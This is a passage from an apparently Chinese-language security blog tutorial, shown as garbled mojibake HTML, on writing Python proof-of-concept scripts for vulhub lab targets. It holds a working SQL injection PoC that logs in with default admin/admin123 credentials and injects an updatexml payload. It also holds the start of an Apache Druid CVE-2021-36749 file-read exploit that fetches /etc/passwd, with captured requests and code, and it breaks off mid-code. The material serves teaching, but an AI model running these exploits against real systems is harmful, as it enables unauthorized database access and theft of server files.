= parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®bannerï¼Œç”¨äºæ­£ç¡®è¿è¡Œè„šæœ¬æ—¶è¾“å‡º</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> _____                   _    _____       _   _____       _           _   _             </span></span><br><span class="line"><span class="string">|  __ \                 (_)  / ____|     | | |_   _|     (_)         | | (_)            </span></span><br><span class="line"><span class="string">| |__) |   _  ___  _   _ _  | (___   __ _| |   | |  _ __  _  ___  ___| |_ _  ___  _ __  </span></span><br><span class="line"><span class="string">|  _  / | | |/ _ \| | | | |  \___ \ / _` | |   | | | &#x27;_ \| |/ _ \/ __| __| |/ _ \| &#x27;_ \ </span></span><br><span class="line"><span class="string">| | \ \ |_| | (_) | |_| | |  ____) | (_| | |  _| |_| | | | |  __/ (__| |_| | (_) | | | |</span></span><br><span class="line"><span class="string">|_|  \_\__,_|\___/ \__, |_| |_____/ \__, |_| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|</span></span><br><span class="line"><span class="string">                    __/ |              | |              _/ |                            </span></span><br><span class="line"><span class="string">                   |___/               |_|             |__/                             </span></span><br><span class="line"><span class="string">                                                                                 v 4.6.0 </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># urlã€cookieã€validateCode(éªŒè¯ç ) ï¼Œ bgurl å€¼ä¸ºåå° sql æ³¨å…¥çš„æ¼æ´é“¾æ¥,å‡æ”¹ä¸ºå‘½ä»¤è¡Œå‚æ•°è¾“å…¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url,cookie,validateCode,bgurl</span>):</span><br><span class="line">    <span class="comment"># è®¾ç½® Headers å¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨å‘é€HTTPè¯·æ±‚ï¼Œé¿å…è¢«æ‹¦æˆªï¼Œå¹¶æºå¸¦ Cookie å€¼è¿›è¡Œè¯·æ±‚,Cookieå€¼ä»å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå‚æ•°ä¸ç”¨æˆ·è¾“å…¥çš„å‚æ•°å€¼åˆ†åˆ«ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ä¸”ä¸­é—´ä½¿ç”¨ : åˆ†éš”å¼€, validateCode å€¼ä»å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:&#123;validateCode&#125;,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ©ç”¨ request è¯·æ±‚ç™»é™†</span></span><br><span class="line">    res = requests.post(url, headers=headers, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬ä¸€å±‚ ifã€elif ä½œä¸ºå¤„ç†ç™»é™†æˆåŠŸæˆ–å¤±è´¥è¿”å›çš„å“åº”ï¼Œç¬¬äºŒå±‚ if ç”¨äºéªŒè¯æ¼æ´ï¼Œè‹¥è¿”å›çš„å“åº”ä¸­å­˜åœ¨ &quot;æ“ä½œæˆåŠŸ&quot; åˆ™è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œå¦åˆ™è·³å‡º</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;æ“ä½œæˆåŠŸ&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="comment"># ç»§ä¸Šä¸€æ­¥çš„ç™»é™†åï¼Œæ„é€ ç™»é™†åçš„æ•°æ®è¯·æ±‚ URL,æ¼æ´ url é€šè¿‡ bgurlï¼ˆ-uï¼‰-&gt; post_url ä¼ å…¥</span></span><br><span class="line">        post_url = bgurl</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ„é€ ç™»é™†åçš„æ¼æ´ç‚¹çš„æ•°æ® POST è¯·æ±‚åŒ…</span></span><br><span class="line">        post_data = &#123;<span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;orderByColumn&#x27;</span>: <span class="string">&#x27;roleSort&#x27;</span>, <span class="string">&#x27;isAsc&#x27;</span>: <span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;roleName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;roleKey&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BbeginTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BendTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;params[dataScope]&#x27;</span>: <span class="string">&#x27;and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523&#x27;</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç™»é™†åç»§ç»­ä¿æŒ headers å¤´ï¼Œè¿™ä¸€æ­¥å¾ˆé‡è¦ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥å°±æ— æ³•ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œç»§è€Œæ— æ³•è¿›è¡Œåå°è¯·æ±‚</span></span><br><span class="line">        post_headers = headers</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¼€å§‹ç™»å½•åçš„åå°æ•°æ®è¯·æ±‚</span></span><br><span class="line">        post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è‹¥ post_requests æ•°æ®è¯·æ±‚å“åº”å­˜åœ¨ &quot;java.sql.SQLException: XPATH syntax error&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œè¿”å› &quot;[+] Vulnerable to SQL injection&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;java.sql.SQLException: XPATH syntax error:&quot;</span> <span class="keyword">in</span> post_requests.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Vulnerable to SQL injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è‹¥ä¸å­˜åœ¨ &quot;java.sql.SQLException: XPATH syntax error&quot; åˆ™è¯æ˜å­˜åœ¨ä¸æ¼æ´ï¼Œè¿”å› &quot;[-] Not vulnerable to SQL injection &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Not vulnerable to SQL injection &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error Occurred, Please Check you input&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å›ºå®šæ ¼å¼ï¼Œç”±äºä¸Šé¢ä»£ç ä½¿ç”¨çš„æ¨¡å—åŒ– def() ç¼–å†™ï¼Œæ‰€ä»¥ä¸‹é¢éœ€è®¾ç½®ä¸»å‡½æ•°è¿›è¡Œæ‰§è¡Œè„šæœ¬</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># æŒ‰ç…§é¡ºåºï¼Œå…ˆæ‰§è¡Œbanner()å‡½æ•°é‡Œé¢çš„ä»£ç ï¼Œåœ¨æ‰§è¡ŒPoc()å‡½æ•°é‡Œé¢çš„ä»£ç ï¼Œå…¶ä¸­Poc()å‡½æ•°ä»£ç ä¸­çš„urlã€cookieã€validateCodeã€bgurlå‡ä½¿ç”¨ argparse åº“è°ƒç”¨ï¼Œä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥ç›¸åº”çš„å€¼</span></span><br><span class="line">    banner()</span><br><span class="line">    Poc(args.url,args.cookie,args.validateCode,args.bgurl)</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œè„šæœ¬å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å›å“åº” <code>[+] Vulnerable to SQL injection</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u [æ¼æ´çš„åå°ç™»å½•é“¾æ¥] -c [ç½‘ç«™çš„cookieå€¼] -v [éªŒè¯ç ] -b [åå°çš„æ¼æ´ç‚¹é“¾æ¥]</span><br><span class="line">python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=de1e9f93-9c51-4520-b106-bff2ed0918ae -v 56 -b http://192.168.148.184:8888/system/role/list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144247358.png" data-caption="image-20230522144247358"><img src="/../images/poc/image-20230522144247358.png" alt="image-20230522144247358"></a></p><p>å½“æ¼æ´ä¸å­˜åœ¨æ—¶ï¼Œè¿™é‡Œä¿®æ”¹æ¼æ´é“¾æ¥æµ‹è¯•ï¼Œè¿”å›å“åº” <code>[-] Not vulnerable to SQL injection </code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=d40bd1c6-40b5-4c6a-ba75-4cbdd0265d4f -v 1 -b http://192.168.148.184:8888/system/menu/list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144440540.png" data-caption="image-20230522144440540"><img src="/../images/poc/image-20230522144440540.png" alt="image-20230522144440540"></a></p><p>å½“è¾“å…¥çš„ Cookie æˆ–è€… éªŒè¯ç é”™è¯¯æ—¶ï¼Œè¿”å›å“åº” <code>[-] Error Occurred, Please Check you input</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144609049.png" data-caption="image-20230522144609049"><img src="/../images/poc/image-20230522144609049.png" alt="image-20230522144609049"></a></p><p>è¿™ Poc å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œè´¦å·å¯†ç çš„å†…ç½®çš„ï¼Œè‹¥ä¸æ˜¯é»˜è®¤admin&#x2F;admin123ï¼Œåˆ™æ— æ³•ç™»å½•ï¼Œè‹¥æƒ³è¦å®Œå…¨è‡ªåŠ¨åŒ–ï¼Œå¯å°†ç™»å½•çš„è´¦å·å¯†ç å‚æ•°åŠ å…¥ <code>argsparse</code>ï¼Œè‹¥èƒ½æ˜ç™½è¿™ç®€å•çš„è„šæœ¬ï¼Œè‡ªå·±ä¿®æ”¹å¾ˆç®€å•ï¼Œä¸Šæ‰‹æ•²ä¸€éï¼ŒåŠ æ·±å°è±¡ã€‚</p><h2 id="ä¸‰ã€ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä¸‰ã€ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä¸‰ã€ä»»æ„æ–‡ä»¶è¯»å–"></a>ä¸‰ã€ä»»æ„æ–‡ä»¶è¯»å–</h2><h3 id="Apache-Druid-LoadData-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2021-36749ï¼‰"><a href="#Apache-Druid-LoadData-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2021-36749ï¼‰" class="headerlink" title="Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2021-36749ï¼‰"></a>Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2021-36749ï¼‰</h3><h4 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vulhub ä¸‹è½½åœ°å€</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># è¿›å…¥ CVE-2021-25646 ç›®å½•è¾“å…¥å‘½ä»¤å¯åŠ¨ç¯å¢ƒ</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213053687.png" data-caption="image-20230513213053687"><img src="/../images/poc/image-20230513213053687.png" alt="image-20230513213053687"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213116533.png" data-caption="image-20230513213116533"><img src="/../images/poc/image-20230513213116533.png" alt="image-20230513213116533"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213211212.png" data-caption="image-20230513213211212"><img src="/../images/poc/image-20230513213211212.png" alt="image-20230513213211212"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213321456.png" data-caption="image-20230513213321456"><img src="/../images/poc/image-20230513213321456.png" alt="image-20230513213321456"></a></p><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šApache Druid Version &lt; 0.22</p></blockquote><h4 id="POC-ä»£ç ç¼–å†™åˆ†æ-1"><a href="#POC-ä»£ç ç¼–å†™åˆ†æ-1" class="headerlink" title="POC ä»£ç ç¼–å†™åˆ†æ"></a>POC ä»£ç ç¼–å†™åˆ†æ</h4><p>é€šè¿‡ Burp æŠ“åŒ…è·å–å…¶æ•°æ®åŒ…ä»¥åŠç›¸åº”çš„æ¼æ´è§¦å‘ç‚¹ï¼Œç”±ä¸‹å›¾å¯çŸ¥ï¼Œæ¼æ´è§¦å‘å‚æ•°ä¸º <code>&quot;uris&quot;</code>ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥å‚æ•°çš„å€¼æ›´æ”¹ä¸ºæ¼æ´ <code>Payload</code> ï¼Œå½“æˆ‘ä»¬è§‚å¯Ÿè¾“å‡ºéªŒè¯çš„ <code>Payload</code> è¿”å›çš„å“åº”å³å¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?for=connect HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.148</span><span class="number">.155</span><span class="punctuation">:</span><span class="number">8888</span></span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">423</span></span><br><span class="line">Accept<span class="punctuation">:</span> application/json<span class="punctuation">,</span> text/plain<span class="punctuation">,</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: application/json;charset=UTF-8</span></span><br><span class="line"><span class="comment">Origin: http://192.168.148.155:8888</span></span><br><span class="line"><span class="comment">Referer: http://192.168.148.155:8888/unified-console.html</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123;&quot;type&quot;:&quot;http&quot;,&quot;uris&quot;:[&quot;file:///etc/passwd&quot;]&#125;,&quot;inputFormat&quot;:&#123;&quot;type&quot;:&quot;regex&quot;,&quot;pattern&quot;:&quot;(.*)&quot;,&quot;columns&quot;:[&quot;raw&quot;]&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,&quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;,&quot;tuningConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;timeoutMs&quot;:15000&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230515180413362.png" data-caption="image-20230515180413362"><img src="/../images/poc/image-20230515180413362.png" alt="image-20230515180413362"></a></p><h4 id="åˆ†æå°ç»“-1"><a href="#åˆ†æå°ç»“-1" class="headerlink" title="åˆ†æå°ç»“"></a>åˆ†æå°ç»“</h4><p>ç”±äºé¶åœºæ²¡æœ‰ç™»å½•éªŒè¯ã€‚è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ passï¼Œè‹¥å­˜åœ¨ç™»å½•éªŒè¯çš„è¯å¯ä»¥å‚è€ƒä¸Šé¢ SQL æ³¨å…¥ Poc ç¼–å†™éƒ¨åˆ†è¿›è¡Œå†æ„é€ ã€‚è¿™è¾¹å°±å½“åšä¸ºä¸€ä¸ªå‰å°çš„æˆ–è€…æœªæˆæƒè®¿é—®çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å»è¿›è¡Œ Poc ç¼–å†™ã€‚</p><blockquote><p>1ã€åˆ©ç”¨ Post è¯·æ±‚æ•°æ®åŒ…ï¼Œç„¶åå°† uri å‚æ•°å€¼ç¼–å†™ä¸ºç”¨æˆ·è¾“å…¥</p><p>2ã€è®¾ç½®ä¸€ä¸ªæ¼æ´ payload åˆ—è¡¨è¿›è¡Œéå†ï¼Œä¹Ÿå¯ä»¥è®©ç”¨æˆ·è¾“å…¥ç‰¹å®šçš„éªŒè¯ payload éªŒè¯æ¼æ´</p></blockquote><h4 id="Poc-åˆæ­¥ç¼–å†™-1"><a href="#Poc-åˆæ­¥ç¼–å†™-1" class="headerlink" title="Poc åˆæ­¥ç¼–å†™"></a>Poc åˆæ­¥ç¼–å†™</h4><p>åˆæ­¥ç¼–å†™éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ <code>JSON</code> æ ¼å¼çš„æ•°æ®è¯·æ±‚é—®é¢˜ï¼Œæ­¤å‰è¯·æ±‚ä¸º <code>requests.post(url,data=data)</code>ï¼Œä½†ç”±äºæœ¬æ¼æ´çš„è¯·æ±‚æ•°æ®æ˜¯ <code>json</code> æ ¼å¼é—®é¢˜ï¼Œæ‰€ä»¥å¾—æ³¨æ„è¯·æ±‚çš„è®¾ç½®ä¸­ <code>data=data</code> éœ€è¦æ›´æ”¹ä¸º <code>json=data</code></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨è®¾ç½®æ¼æ´é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp æŠ“å–çš„æ¼æ´ post è¯·æ±‚æ•°æ®åŒ…ï¼Œç”¨äºéªŒè¯æ¼æ´ï¼Œä¸»è¦è§¦å‘ç‚¹ä¸º &quot;uris&quot; çš„å‚æ•°å€¼</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ requests åº“è¯·æ±‚ç›®æ ‡ï¼Œpost è¯·æ±‚æ ¼å¼ä¸º json=post_data,å¹¶ä½¿ç”¨ verify=False å’Œ allow_redirects=False å‚æ•°æ¥å‘é€å¸¦æœ‰ç¦ç”¨ SSL éªŒè¯å’Œç¦ç”¨é‡å®šå‘çš„è¯·æ±‚</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›è¯·æ±‚çš„ text ,å…ˆæ‰‹å·¥æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p>ç”±è¿”å›åŒ…å¯çŸ¥åˆæ­¥ç¼–å†™çš„ Poc èƒ½æ­£å¸¸éªŒè¯æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230515191157167.png" data-caption="image-20230515191157167"><img src="/../images/poc/image-20230515191157167.png" alt="image-20230515191157167"></a></p><h4 id="å®Œå–„ä»£ç -1"><a href="#å®Œå–„ä»£ç -1" class="headerlink" title="å®Œå–„ä»£ç "></a>å®Œå–„ä»£ç </h4><p>ç”±ä¸Šä¸€æ­¥æˆ‘ä»¬åˆæ­¥å®ç°çš„ <code>Poc</code> çš„ç¼–å†™ï¼Œä½†è¿˜æ˜¯ä¸å¤Ÿè‡ªåŠ¨åŒ–ï¼Œè¿™è¾¹ä¸»è¦è§£å†³å‡ ä¸ªç‚¹ï¼šæ¼æ´ <code>URL</code> ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥ï¼›<code>post</code> æ•°æ®å‚æ•° <code>uris</code> çš„éªŒè¯ <code>payload </code>å¤ªå•ä¸€ï¼Œè‹¥ç³»ç»Ÿä¸ä¸€æ ·åˆ™ä¼šå‡ºç°æ¼æŠ¥ç°è±¡ï¼Œè¿™è¾¹çš„ <code>Payload</code> æ”¹ä¸ºå·²å®šä¹‰çš„ <code>list</code> éå† <code>payload</code>ï¼Œé¿å…å‡ºç°æ¼æŠ¥ï¼›ç¾åŒ–ä»£ç æ ¼å¼ </p><p>1ã€é¦–å…ˆå°†åŸå…ˆç®€é™‹çš„ä»£ç æ¨¡å—åŒ–ï¼Œå®šä¹‰ä¸€ä¸ª Poc() å‡½æ•°å¤„ç†ä»£ç </p><p>åŸä»£ç </p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨è®¾ç½®æ¼æ´é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp æŠ“å–çš„æ¼æ´ post è¯·æ±‚æ•°æ®åŒ…ï¼Œç”¨äºéªŒè¯æ¼æ´ï¼Œä¸»è¦è§¦å‘ç‚¹ä¸º &quot;uris&quot; çš„å‚æ•°å€¼</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span 